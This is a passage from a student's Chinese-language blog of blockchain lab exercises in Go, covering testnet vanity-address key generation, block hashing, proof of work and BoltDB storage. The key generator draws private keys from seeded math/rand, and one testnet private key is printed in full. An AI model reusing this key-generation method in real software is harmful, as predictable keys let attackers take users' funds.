&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MineCracker_test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		privatekey,public :=newKeyPair()</span><br><span class="line">		address := getAddress(public)</span><br><span class="line">		<span class="keyword">if</span> Checkccc(address) == <span class="literal">true</span> &#123;</span><br><span class="line">			fmt.Printf(<span class="string">&quot;%x\n&quot;</span>,privatekey.D.Bytes())</span><br><span class="line">			fmt.Printf(<span class="string">&quot;%s\n&quot;</span>,hex.EncodeToString(public))</span><br><span class="line">			fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, address)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在生成随机数环节费劲了一些周折，GenerateKey的第二个参数要求是io.reader类型，正好能对应上<code>crypto/rand</code>里的rand.reader函数，但可惜<code>crypto/rand</code>无法设置种子。<code>math/rand</code>可以设置种子，但是我们需要找到一个能对接上io.reader的rand函数填充进去。经过我不懈的努力，使劲的读go里面ecdsa的源码，了解到了这里面是从一个熵源中不断获取字节串然后转为私钥，所以我们需要生成一个生成足够长字符串的函数，然后利用<code>strings.NewReader</code>这个函数转化为输入流，即io.reader，源码中对字节串长度要求是50，所以我们生成一个长度为50的字符串即可。</p>
<p>以下是我的私钥和公钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6969695c49dcc6b9871b1d65838faceb4727bb1ffa7b3a621b47fadf265d2b368</span><br><span class="line">62d3a4bfe04b3d36356ca63ae50c50696e2c3bb366eae2f5349b0eda1bcf54b29288153f70581ab5dd7b0ed963998b7c0526eb93743d72f842768d50baee0372</span><br><span class="line">mgnLo3xn5CzEyD3N6LKTg9GtcccvrixwXs</span><br></pre></td></tr></table></figure>
<p><strong>存疑一</strong>：我不知道公钥是啥格式，我这是128长度的，之前文件的样例是66长度的，是压缩公钥形式，具体形式待向助教求证。</p>
<p><strong>存疑二：</strong> 用的是GO库里自带的P256曲线，别名是 secp256r1，好像应该用secp256k1？？</p>
<p>此为我领取成功的截图。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211021234404398.png" alt="image-20211021234404398"></p>
<p>挖到了人生第一枚币！虽然是测试用的。</p>
<p>经过助教核实，公钥就要33字节的，于是我又花了一上午往我的goroot下安装第三方库，跑到go的官方文档去找到了</p>
<p><a href="https://pkg.go.dev/github.com/BSNDA/PCNGateway-Go-SDK/pkg/util/crypto/secp256k1#pkg-variables，有我们熟悉的函数，接口可以直接对接。">https://pkg.go.dev/github.com/BSNDA/PCNGateway-Go-SDK/pkg/util/crypto/secp256k1#pkg-variables，有我们熟悉的函数，接口可以直接对接。</a></p>
<p>至于压缩公钥的，有这个<a href="https://pkg.go.dev/github.com/decred/dcrd/dcrec/secp256k1#section-readme，但可惜调用不了，还有C的底层代码，懒得去装了，直接手写了一个压缩公钥的（又是特别丑的代码">https://pkg.go.dev/github.com/decred/dcrd/dcrec/secp256k1#section-readme，但可惜调用不了，还有C的底层代码，懒得去装了，直接手写了一个压缩公钥的（又是特别丑的代码</a></p>
<p>为了彻底跑通这个代码还去补充了这个第三方库<a href="https://github.com/pkg/errors/blob/master/errors.go">https://github.com/pkg/errors/blob/master/errors.go</a></p>
<p>把第三方库装齐了之后终于能跑通啦，这是全新的代码：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/ecdsa&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/BSNDA/PCNGateway-Go-SDK/pkg/util/crypto/secp256k1&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">var</span> src = rand.New(rand.NewSource(xxxxxxxx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RandStringBytesMaskImprSrc</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	b := <span class="built_in">make</span>([]<span class="keyword">byte</span>, (n+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">	<span class="keyword">if</span> _, err := src.Read(b); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> hex.EncodeToString(b)[:n]</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BytesToInt</span><span class="params">(b []<span class="keyword">byte</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	bytesBuffer := bytes.NewBuffer(b)</span><br><span class="line">	<span class="keyword">var</span> x <span class="keyword">int32</span></span><br><span class="line">	binary.Read(bytesBuffer, binary.BigEndian, &amp;x)</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">int</span>(x)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">secp256</span><span class="params">()</span> <span class="params">(ecdsa.PrivateKey,[]<span class="keyword">byte</span>)</span></span>&#123;</span><br><span class="line">	curve := secp256k1.SECP256K1()</span><br><span class="line">	privKey, err := ecdsa.GenerateKey(curve, strings.NewReader(RandStringBytesMaskImprSrc(<span class="number">50</span>)))</span><br><span class="line">	<span class="keyword">if</span> err !=<span class="literal">nil</span>&#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	Y := hex.EncodeToString(privKey.PublicKey.Y.Bytes())</span><br><span class="line">	length := <span class="built_in">len</span>(Y)</span><br><span class="line">	<span class="keyword">var</span> pubKey []<span class="keyword">byte</span></span><br><span class="line">	<span class="keyword">if</span> Y[length - <span class="number">1</span>] % <span class="number">2</span> == <span class="number">1</span> &#123;</span><br><span class="line">		pubKey = <span class="built_in">append</span>([]<span class="keyword">byte</span>(<span class="string">&quot;\x03&quot;</span>),privKey.PublicKey.X.Bytes()...)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		pubKey = <span class="built_in">append</span>([]<span class="keyword">byte</span>(<span class="string">&quot;\x02&quot;</span>),privKey.PublicKey.X.Bytes()...)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> *privKey, pubKey</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Checkccc</span><span class="params">(src <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	length := <span class="built_in">len</span>(src)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; length - <span class="number">2</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> src[i] == <span class="string">&#x27;c&#x27;</span> &amp;&amp; src[i + <span class="number">1</span>] ==<span class="string">&#x27;c&#x27;</span> &amp;&amp; src[i + <span class="number">2</span>] ==<span class="string">&#x27;c&#x27;</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MineCracker_test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		privatekey,public :=secp256()</span><br><span class="line">		address := getAddress(public)</span><br><span class="line">		<span class="keyword">if</span> Checkccc(address) == <span class="literal">true</span> &#123;</span><br><span class="line">			fmt.Printf(<span class="string">&quot;%x\n&quot;</span>,privatekey.D.Bytes())</span><br><span class="line">			fmt.Printf(<span class="string">&quot;%s\n&quot;</span>,hex.EncodeToString(public))</span><br><span class="line">			fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, address)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>改了个seed，挖到了地址，提交，成功获得0.001测试币，这次我真的拿到私钥了，这次绝对能用了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">326138383534xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx(私钥保密</span><br><span class="line">038301a3c40bea42c622ecbeb453900aaad4124397993d2282781b4f2a5c32410d</span><br><span class="line">mwaXcViKVmtYHomvL7eHh9pncccPtyyHrb</span><br></pre></td></tr></table></figure>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211023135225388.png" alt="image-20211023135225388"></p>
<p>队友s0uthwood推荐的另外一种装secp256k1更方便的方法：<a href="https://blog.csdn.net/lancefox/article/details/107321807">https://blog.csdn.net/lancefox/article/details/107321807</a></p>
<h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><p>因为疫情重庆比赛计划被学校拦了，心态炸裂。</p>
<h2 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h2><h3 id="构建区块"><a href="#构建区块" class="headerlink" title="构建区块"></a>构建区块</h3><p>不得不说实验设计的是真的好，手把手教学。</p>
<p>这一个实验就让你写几行代码，一个区块要维护的信息有：时间戳，数据块，前一节点哈希，还有自身哈希，自身哈希由前三个计算得来，所以我们只需要把前三个拼起来算个哈希即可。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;crypto/sha256&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Block <span class="keyword">struct</span> &#123;</span><br><span class="line">	Time <span class="keyword">int64</span></span><br><span class="line">	Data []<span class="keyword">byte</span></span><br><span class="line">	PrevHash []<span class="keyword">byte</span></span><br><span class="line">	Hash []<span class="keyword">byte</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewBlock</span><span class="params">(data <span class="keyword">string</span>, prevHash []<span class="keyword">byte</span>)</span> *<span class="title">Block</span></span> &#123;</span><br><span class="line">	block := &amp;Block&#123;time.Now().Unix(), []<span class="keyword">byte</span>(data), prevHash, []<span class="keyword">byte</span>&#123;&#125;&#125;</span><br><span class="line">	block.SetHash()</span><br><span class="line">	<span class="keyword">return</span> block</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span> <span class="title">SetHash</span><span class="params">()</span></span> &#123;</span><br><span class="line">	Hash := sha256.Sum256(<span class="built_in">append</span>(<span class="built_in">append</span>(b.PrevHash, IntToHex(b.Time)...), b.Data...))</span><br><span class="line">	b.Hash = Hash[:]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试代码：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">block_test</span><span class="params">()</span></span> &#123;</span><br><span class="line">   block := NewBlock(<span class="string">&quot;Genesis Block&quot;</span>, []<span class="keyword">byte</span>&#123;&#125;)</span><br><span class="line">   fmt.Printf(<span class="string">&quot;Prev. hash: %x\n&quot;</span>, block.PrevHash)</span><br><span class="line">   fmt.Printf(<span class="string">&quot;Time: %s\n&quot;</span>, time.Unix(block.Time, <span class="number">0</span>).Format(<span class="string">&quot;2006-01-02 15:04:05&quot;</span>))</span><br><span class="line">   fmt.Printf(<span class="string">&quot;Data: %s\n&quot;</span>, block.Data)</span><br><span class="line">   fmt.Printf(<span class="string">&quot;Hash: %x\n&quot;</span>, block.Hash)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出成功截图</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211026111516645.png" alt="image-20211026111516645"></p>
<h3 id="实现一条链"><a href="#实现一条链" class="headerlink" title="实现一条链"></a>实现一条链</h3><p>这个就是字面意思，实现一个创世链头，实现一个往尾部插的函数，就结束了。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Blockchain <span class="keyword">struct</span> &#123;</span><br><span class="line">	blocks []*Block</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *Blockchain)</span> <span class="title">AddBlock</span><span class="params">(data <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	Hash := bc.blocks[<span class="built_in">len</span>(bc.blocks) - <span class="number">1</span>].Hash</span><br><span class="line">	block := NewBlock(data, Hash)</span><br><span class="line">	bc.blocks = <span class="built_in">append</span>(bc.blocks, block)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewGenesisBlock</span><span class="params">()</span> *<span class="title">Block</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> NewBlock(<span class="string">&quot;Genesis Block&quot;</span>, []<span class="keyword">byte</span>(<span class="string">&quot;&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewBlockchain</span><span class="params">()</span> *<span class="title">Blockchain</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;Blockchain&#123;[]*Block&#123;NewGenesisBlock()&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>实验截图：<br><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211026141111899.png" alt="image-20211026141111899"></p>
<h3 id="添加工作量证明模块"><a href="#添加工作量证明模块" class="headerlink" title="添加工作量证明模块"></a>添加工作量证明模块</h3><p>这个对区块计算哈希的方法进行了修改，新增了区块中nonce的属性，然后time和data的顺序都有变化，但我们不必到<code>block.go</code>里修改，因为这里的<code>prepareData</code>函数已经帮我们拼好了，我们只需要对这个函数的返回值算哈希就好了。</p>
<p>然后在<code>Run</code>这个函数的时候，我们就把nonce从0开始加，每次新算一遍hash，如果转成BigInt如果小于$2^{236}$就表示前20位为0了，工作量证明完毕，区块可以进行添加。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/sha256&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math/big&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> targetBits = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ProofOfWork <span class="keyword">struct</span> &#123;</span><br><span class="line">	block  *Block</span><br><span class="line">	target *big.Int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewProofOfWork</span><span class="params">(b *Block)</span> *<span class="title">ProofOfWork</span></span> &#123;</span><br><span class="line">	target := big.NewInt(<span class="number">1</span>)</span><br><span class="line">	target.Lsh(target, <span class="keyword">uint</span>(<span class="number">256</span>-targetBits))</span><br><span class="line"></span><br><span class="line">	pow := &amp;ProofOfWork&#123;b, target&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> pow</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pow *ProofOfWork)</span> <span class="title">prepareData</span><span class="params">(nonce <span class="keyword">int64</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	data := bytes.Join(</span><br><span class="line">		[][]<span class="keyword">byte</span>&#123;</span><br><span class="line">			pow.block.PrevHash,</span><br><span class="line">			pow.block.Data,</span><br><span class="line">			IntToHex(pow.block.Time),</span><br><span class="line">			IntToHex(<span class="keyword">int64</span>(targetBits)),</span><br><span class="line">			IntToHex(nonce),</span><br><span class="line">		&#125;,</span><br><span class="line">		[]<span class="keyword">byte</span>&#123;&#125;,</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pow *ProofOfWork)</span> <span class="title">Run</span><span class="params">()</span> <span class="params">(<span class="keyword">int64</span>, []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> hashInt big.Int</span><br><span class="line">	<span class="keyword">var</span> hash [<span class="number">32</span>]<span class="keyword">byte</span></span><br><span class="line">	<span class="keyword">var</span> nonce <span class="keyword">int64</span></span><br><span class="line">	nonce = <span class="number">0</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;Mining the block containing \&quot;%s\&quot;\n&quot;</span>, pow.block.Data)</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		here := pow.prepareData(nonce)</span><br><span class="line">		hash = sha256.Sum256(here)</span><br><span class="line">		hashInt.SetBytes(hash[:])</span><br><span class="line">		<span class="keyword">if</span> hashInt.Cmp(pow.target) &lt; <span class="number">0</span> &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		nonce += <span class="number">1</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;\r%x&quot;</span>, hash)</span><br><span class="line">	fmt.Print(<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> nonce, hash[:]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pow *ProofOfWork)</span> <span class="title">Validate</span><span class="params">()</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> hashInt big.Int</span><br><span class="line">	hashInt.SetBytes(pow.block.Hash)</span><br><span class="line">	<span class="keyword">if</span> hashInt.Cmp(pow.target) &lt; <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时区块部分代码修改， 重点在于SetHash，要经过一段时间的计算。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Block <span class="keyword">struct</span> &#123;</span><br><span class="line">	Time <span class="keyword">int64</span></span><br><span class="line">	Data []<span class="keyword">byte</span></span><br><span class="line">	PrevHash []<span class="keyword">byte</span></span><br><span class="line">	Hash []<span class="keyword">byte</span></span><br><span class="line">	Nonce <span class="keyword">int64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewBlock</span><span class="params">(data <span class="keyword">string</span>, prevHash []<span class="keyword">byte</span>)</span> *<span class="title">Block</span></span> &#123;</span><br><span class="line">	block := &amp;Block&#123;time.Now().Unix(), []<span class="keyword">byte</span>(data), prevHash, []<span class="keyword">byte</span>&#123;&#125;, <span class="number">0</span>&#125;</span><br><span class="line">	block.SetHash()</span><br><span class="line">	<span class="keyword">return</span> block</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span> <span class="title">SetHash</span><span class="params">()</span></span> &#123;</span><br><span class="line">	pow := NewProofOfWork(b)</span><br><span class="line">	b.Nonce, b.Hash = pow.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211026194736013.png" alt="image-20211026194736013"></p>
<h3 id="阅读代码：添加数据库"><a href="#阅读代码：添加数据库" class="headerlink" title="阅读代码：添加数据库"></a>阅读代码：添加数据库</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/boltdb/bolt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Blockchain_in_dbIterator <span class="keyword">struct</span> &#123;</span><br><span class="line">	currentHash []<span class="keyword">byte</span></span><br><span class="line">	db          *bolt.DB</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *Blockchain_in_db)</span> <span class="title">Iterator</span><span class="params">()</span> *<span class="title">Blockchain_in_dbIterator</span></span> &#123;</span><br><span class="line">	bci := &amp;Blockchain_in_dbIterator&#123;bc.tip, bc.db&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> bci</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(i *Blockchain_in_dbIterator)</span> <span class="title">Next</span><span class="params">()</span> *<span class="title">Block</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> block *Block</span><br><span class="line"></span><br><span class="line">	err := i.db.View(<span class="function"><span class="keyword">func</span><span class="params">(tx *bolt.Tx)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">		b := tx.Bucket([]<span class="keyword">byte</span>(blocksBucket))</span><br><span class="line">		encodedBlock := b.Get(i.currentHash)</span><br><span class="line">		block = DeserializeBlock(encodedBlock)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	i.currentHash = block.PrevHash</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> block</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>三个问题：</p>
<ul>
<li><p>为什么需要在block类中添加Serialize()和DeserializeBlock()两个函数？他们主要做了什么？   </p>
<p>序列化是将对象转化为字节串从而能存进数据库进行保存，而反序列化是能从字节串完全恢复出一个对象来。</p>
</li>
<li><p>描述一下NewBlockchain()和NewBlock()的执行逻辑。</p>
<p>打开数据库文件，检查是否存在一个区块链，若存在则创建实例， tip设置为最后一个区块hash，若不存在则创建创世区块，存进数据库，把key1设位创世块的hash，tip指向他。</p>
</li>
<li><p>Blockchain类中的tip变量是做什么用的？</p>
<p>tip变量定义为从数据中读取出来的变量，当存在区块链时，tip设置为读取到的最后一个区块hash；当不存在区块链时，tip设置为创世区块的 hash。实际上可以理解tip为区块链的一种标识符。</p>
</li>
<li><p>迭代器Interator是如何工作使得我们能够从数据库中遍历出区块信息的？</p>
<p>数据库迭代器，通过迭代器的next操作遍历整个数据库，从而做到区块的遍历。</p>
</li>
</ul>
<h3 id="实现命令行接口"><a href="#实现命令行接口" class="headerlink" title="实现命令行接口"></a>实现命令行接口</h3><p>添加两个命令行参数：</p>
<ul>
<li><code>listblocks</code> 把当前链的所有节点的信息输出</li>
<li><code>newblock</code>后跟<code>-data</code> 参数外加节点信息。</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;flag&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/boltdb/bolt&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> dbFile = <span class="string">&quot;Blockchain_in_db_demo.db&quot;</span></span><br><span class="line"><span class="keyword">const</span> blocksBucket = <span class="string">&quot;blocks&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Blockchain_in_db <span class="keyword">struct</span> &#123;</span><br><span class="line">	tip []<span class="keyword">byte</span></span><br><span class="line">	db  *bolt.DB</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bc *Blockchain_in_db)</span> <span class="title">AddBlock</span><span class="params">(data <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> lastHash []<span class="keyword">byte</span></span><br><span class="line"></span><br><span class="line">	err := bc.db.View(<span class="function"><span class="keyword">func</span><span class="params">(tx *bolt.Tx)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">		b := tx.Bucket([]<span class="keyword">byte</span>(blocksBucket))</span><br><span class="line">		lastHash = b.Get([]<span class="keyword">byte</span>(<span class="string">&quot;l&quot;</span>))</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//fmt.Printf(&quot;abbb %s %s\n&quot;,string(data), lastHash)</span></span><br><span class="line">	newBlock := NewBlock(data, lastHash)</span><br><span class="line"></span><br><span class="line">	err = bc.db.Update(<span class="function"><span class="keyword">func</span><span class="params">(tx *bolt.Tx)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">		b := tx.Bucket([]<span class="keyword">byte</span>(blocksBucket))</span><br><span class="line">		<span class="comment">//fmt.Printf(&quot;aaa%s\n&quot;,string(newBlock.Hash))</span></span><br><span class="line">		err := b.Put(newBlock.Hash, newBlock.Serialize())</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Panic(err)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		err = b.Put([]<span class="keyword">byte</span>(<span class="string">&quot;l&quot;</span>), newBlock.Hash)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Panic(err)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		bc.tip = newBlock.Hash</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewBlockchain_in_db</span><span class="params">()</span> *<span class="title">Blockchain_in_db</span></span> &#123;</span><br><span class="line">	fmt.Print(<span class="string">&quot;No existing blockchain found. creating a new one...\n&quot;</span>)</span><br><span class="line">	<span class="keyword">var</span> tip []<span class="keyword">byte</span></span><br><span class="line">	db, err := bolt.Open(dbFile, <span class="number">0600</span>, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Panic(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = db.Update(<span class="function"><span class="keyword">func</span><span class="params">(tx *bolt.Tx)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">		b := tx.Bucket([]<span class="keyword">byte</span>(blocksBucket))</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> b == <span class="literal">nil</span> &#123;</span><br><span class="line">			genesis := NewGenesisBlock()</span><br><span class="line">			b, err := tx.CreateBucket([]<span class="keyword">byte</span>(blocksBucket))</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				log.Panic(err)</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			err = b.Put(genesis.Hash, genesis.Serialize())</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				log.Panic(err)</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			err = b.Put([]<span class="keyword">byte</span>(<span class="string">&quot;l&quot;</span>), genesis.Hash)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				log.Panic(err)</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			tip = genesis.Hash</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			tip = b.Get([]<span class="keyword">byte</span>(<span class="string">&quot;l&quot;</span>))</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	bc := Blockchain_in_db&#123;tip, db&#125;</span><br><span class="line"></span><br><span class="line">	